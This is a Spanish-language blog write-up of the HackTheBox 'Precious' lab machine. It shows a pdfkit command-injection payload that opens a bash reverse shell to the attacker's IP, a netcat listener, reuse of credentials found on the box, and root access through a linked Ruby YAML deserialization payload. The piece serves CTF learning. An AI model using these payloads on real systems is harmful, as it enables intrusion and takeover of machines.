# Primeros pasos

En este artículo voy a subir mi writeup vulnerando la máquina Precious del sitio web HackTheBox. Voy a ir paso a paso explicando poco a poco los pasos que voy realizando. He estado entrando e investigando y después de un par de días intentandolo resolver por mi mismo, traigo esta writeup para poder coger la flag, o bandera y así completar esta máquina. 

# Materiales

En esta máquina recomiendo tener un sistema operativo Linux, conectarnos a la VPN de HTB y tener nociones sobre herramientas básicas de pentesting.

# Resolución Máquina Precious

- Primero haremos ping para ver si llegamos a la máquina con una traza ICMP

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/1.png"/>
</div>

- Ahora que vemos que tenemos conexión, vamos a realizar un escaneo de los puertos de la máquina con Nmap (puedes encontrar un tutorial sobre esta herramienta en mi blog). Cómo podemos comprobar, tenemos abiertos los puertos 22/tcp y 80/tcp. El 22/tcp corresponde al servicio ssh y al 80/tcp pertenece al servicio http.

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/2.png"/>
</div>

- Si usamos el comando curl podremos ver el dominio http://precious.htb

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/3.png"/>
</div>

- Voy a editar mi archivo /etc/hosts y pondré los siguientes parámetros:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/4.png"/>
</div>

- Ahora, si abrimos nuestro navegador de confianza, podremos ver la siguiente página web, un convertidor de web a pdf:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/5.png"/>
</div>

- Ahora necesitaremos crear un servidor con python para ver si podemos realizar algunas peticiones. Tranquil@, no necesitas saber este lenguaje para este ejercicio, ya que es un comando muy sencillo:

```
sudo python3 -m http.server 80
```

- Ahora, nos metemos en la web y en el buscador vamos a apuntar a nuestro servidor http que hemos creado de la siguiente manera:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/6.png"/>
</div>

- Cómo podemos ver, nos llega una petición a nuestro servicio http, además nos descarga un documento pdf:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/7.png"/>
</div>
<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/8.png"/>
</div>

- A continuación necesitaremos una herramienta llamada exiftool que nos dará información avanzada sobre un archivo pdf, lo usaremos para ver esa información del archivo pdf descargado. La instalaremos fácilmente de la siguiente manera:

```
sudo apt install exiftool
```

- Vamos a cambiar el nombre del archivo y le pondremos precious.pdf, y vamos a analizarlo:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/9.png"/>
</div>

- Oh vaya, ha sido genereado con pdfkit v0.8.6. Es hora de llegar a la parte divertida, crear una reverse shell. Voy a crear una injección, en este artículo puedes encontrar este payload de la página [Snyk vulnerability DB](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). Con él vamos a realizar un exploit muy sencillo usando el convertidor que tiene la página http precious de la siguiente manera: 

```
http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/"TuIP"/443 0>&1"`'}
```
<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/10.png"/>
</div>

- Antes de ejecutar eso en la aplicación web, escucharemos por netcat con el siguiente comando:

```
sudo netcat -lvnp 443
```

- Ya tenemos la reverse shell, mejor no podemos ir.

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/11.png"/>
</div>

- Cómo podemos comprobar somos el usuario ruby

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/12.png"/>
</div>

- He navegado por los directorios, y específiamente en ~/.bundle tenemos información relevante sobre un usuario llamado henry. ¿Qué puertos tenemos abiertos en esta máquina además del servicio HTTP? correcto, el servicio SSH. Vamos a probar acceso al usuario henry por ssh haber si tenemos acceso con las credenciales obtenidas:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/13.png"/>
</div>

- Ya tenemos acceso a la máquina con el usuario henry y con esto ya tenemos la primera flag, la obtendremos de la siguiente manera:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/14.png"/>
</div>

<br>

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/15.png"/>
</div>

- Apuntamos esta flag en un archivo txt para más adelante agregarla en HTB y así obtenerla. Continuamos  mirando si los permisos de sudoers, podemos ver que podemos ejecutar un archivo de ruby como root. Si leemos el archivo podemos comprobar que en una parte intenta cargar a dependencies.yml Podrás comprobar lo mencionado en la siguiente captura:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/16.png"/>
</div>

- Con el siguiente payload vamos a ejecutar un comando para realizar la bash suid (son permisos de acceso que pueden asignarse a archivos o directorios en un sistema operativo basado en Unix. Se suele utilizar para permitir a los usuarios del sistema ejecutar binarios con privilegios elevados temporalmente para realizar una tarea en específico.) [Pincha aquí para obtener el payload](https://gist.githubusercontent.com/staaldraad/89dffe369e1454eedd3306edc8a7e565/raw/4b85e6fe8f5708f0a7ba87dbecb6954f8f380bee/ruby_yaml_load_sploit2.yaml). Yo lo he copiado y pegado en un archivo que me he hecho en el escritorio, además cambiaremos el git_set, cómo podemos ver en la captura: 

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/17.png"/>
</div>

- Ahora solo nos queda ejecutar el script ruby y cargar el yml, si ejecutamos el comando ya tendremos la bash suid:

```
sudo ruby /opt/update_dependencies.rb 2>/dev/null
```

- Ya tenemos la bash como propietarios !!! Esto significa que ya podemos leer la flag.

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/18.png"/>
</div>

- Lo único que tenemos que realizar es lo siguiente:

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/19.png"/>
</div>

- Lo único que nos queda es subir las dos flags encontradas, la de henry y la de root, a HackTheBox y ya tendremos la máquina PWNED.

# Precious have been pwned

Ya tenemos la máquina comprometida, tenenmos la flag de henry (usuario) y la flag de root, por lo que ya tenemos la máquina precious completamente realizada 

<div class="imgs">
  <img src="/assets/images/articulos/2023-01-23-maquina-precious/pwnd.png"/>
</div>










































